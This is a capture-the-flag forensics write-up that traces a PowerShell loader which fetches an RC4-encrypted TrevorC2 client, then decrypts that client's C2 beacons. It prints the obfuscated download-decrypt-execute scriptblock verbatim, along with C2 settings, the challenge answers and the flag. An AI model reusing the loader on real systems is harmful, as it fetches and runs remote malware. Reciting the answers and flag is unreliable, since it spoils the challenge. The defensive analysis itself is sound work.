# Masquerade — Detailed Writeup

## Overview

This challenge had two artifacts:

- `Powershell-Operational.evtx`
- `traffic.pcapng`

The investigation breaks into two stages:

1. A PowerShell scriptblock downloads and decrypts a second-stage payload.
2. The decrypted .NET payload is a TrevorC2 client that beacons over HTTP and sends encrypted command results back to the C2.

---

## 1) Scriptblock analysis

The key scriptblock was:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }

$s = 0..255
$j = 0
for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
    $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
}

$i = $j = 0
$d = foreach ($byte in $b) {
    $i = ($i + 1) % 256
    $j = ($j + $s[$i]) % 256
    $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
    $byte -bxor $s[($s[$i] + $s[$j]) % 256]
}

$p = $env:TEMP + '\amdfendrsr.exe'
[System.IO.File]::WriteAllBytes($p, $d)
Start-Process $p
```

### What it does

- Builds a key from the string:
  `X9vT3pL2QwE8xR6ZkYhC4s`
- Downloads `http://api-edgecloud.xyz/amd.bin`
- Removes the literal `s` characters from the downloaded text
- Interprets the remainder as hex
- Decrypts the hex bytes with **RC4**
- Writes the decrypted PE file to:
  `%TEMP%\amdfendrsr.exe`
- Executes it

### IoCs from the scriptblock

- Domain: `api-edgecloud.xyz`
- URL: `http://api-edgecloud.xyz/amd.bin`
- Dropped file: `amdfendrsr.exe`
- Drop location: `%TEMP%\amdfendrsr.exe`
- Script path: `C:\Users\jim\Downloads\updates.ps1`
- ScriptBlock ID: `f3e51d8b-a580-40a4-ab12-4384c40ca729`

---

## 2) Extracting and decrypting `amd.bin`

The PCAP contains the request:

```http
GET /amd.bin HTTP/1.1
Host: api-edgecloud.xyz
```

The response body is hex-encoded data. After converting hex to bytes and decrypting with RC4 using the scriptblock key, the payload starts with `MZ`, confirming it is a PE file.

### Helpful command workflow

```bash
tshark -r traffic.pcapng -Y 'http.request.uri contains "amd.bin"' -T fields -e http.date
```

Then decrypt the response body in CyberChef or with a script using:

- Input format: Hex
- Cipher: RC4
- Key: `X9vT3pL2QwE8xR6ZkYhC4s`

### Extracted payload properties

- SHA-256:
  `e3d39d42df63c6874780737244370ba517820f598fd2443e47ff6580f10c17cb`

- The payload is a .NET assembly.

---

## 3) Decompiling the payload

The .NET payload was decompiled to reveal it is a **TrevorC2 client**.

A useful decompilation command is:

```bash
dotnet tool install -g ilspycmd
ilspycmd program.exe -o ./decompiled/
```

From the binary strings / decompilation, the TrevorC2 settings are:

- C2 URL: `http://34.174.57.99`
- Beacon path: `/images`
- Query parameter: `guid=`
- User-Agent:
  `Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko`
- TrevorC2 encryption passphrase:
  `M4squ3r4d3Th3P4ck3tSt34lthM0d31337`

The TrevorC2 client uses:

- **AES-256-CBC**
- Key derivation: `SHA-256(passphrase)`

---

## 4) Decrypting the commands in the PCAP

TrevorC2 sends encrypted command data in the `guid` parameter.

### Extract all GUID values

```bash
tshark -r traffic.pcapng -Y 'http.request.uri contains "guid"' -T fields -e http.request.uri | sed 's|/images?guid=||'
```

### Decryption logic

The `guid` value is:

1. base64-decoded
2. base64-decoded again
3. split into:
   - first 16 bytes = IV
   - remainder = AES-CBC ciphertext
4. decrypted with:

```python
key = hashlib.sha256(b"M4squ3r4d3Th3P4ck3tSt34lthM0d31337").digest()
```

### Decryption script

```python
import base64
import hashlib
from Crypto.Cipher import AES

key = hashlib.sha256(b"M4squ3r4d3Th3P4ck3tSt34lthM0d31337").digest()

guids = [
    # paste all GUID values here
]

for i, g in enumerate(guids):
    data = base64.b64decode(base64.b64decode(g))
    iv = data[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    result = cipher.decrypt(data[16:])
    print(f"[{i}] {result}")
```

### Decrypted results

The decrypted traffic shows:

- Initial registration:
  `magic_hostname=DESKTOP-I6C5C7M`

- Command output including:
  - `whoami`
  - `ipconfig /all`

- Final decrypted beacon contains the flag:

  `THM{m45k3d_tr4ff1c_0v3r_c0v3rt_ch4nn3lz}`

---

## 5) Answers

1. External domain contacted during script execution: `api-edgecloud.xyz`
2. Encryption algorithm used by the script: `RC4`
3. Key used to decrypt the second-stage payload: `X9vT3pL2QwE8xR6ZkYhC4s`
4. Timestamp of the server response containing the payload: `2026-04-10 05:28:23 GMT`
5. SHA-256 of the decrypted payload: `e3d39d42df63c6874780737244370ba517820f598fd2443e47ff6580f10c17cb`
6. Remote URL used by the client: `http://34.174.57.99/images?guid=`
7. Client encryption: `AES-256-CBC`, key derived from `SHA-256(M4squ3r4d3Th3P4ck3tSt34lthM0d31337)`
8. Flag: `THM{m45k3d_tr4ff1c_0v3r_c0v3rt_ch4nn3lz}`

---

## 6) Commands used in the analysis

```bash
# RC4-decrypt the amd.bin response after extracting it from the PCAP
tshark -r traffic.pcapng -Y 'http.request.uri contains "amd.bin"' -T fields -e http.date

# Pull all TrevorC2 GUID beacons
tshark -r traffic.pcapng -Y 'http.request.uri contains "guid"' -T fields -e http.request.uri | sed 's|/images?guid=||'

# Decompile the .NET payload
dotnet tool install -g ilspycmd
ilspycmd program.exe -o ./decompiled/

# Hash the payload
sha256sum program.exe
```
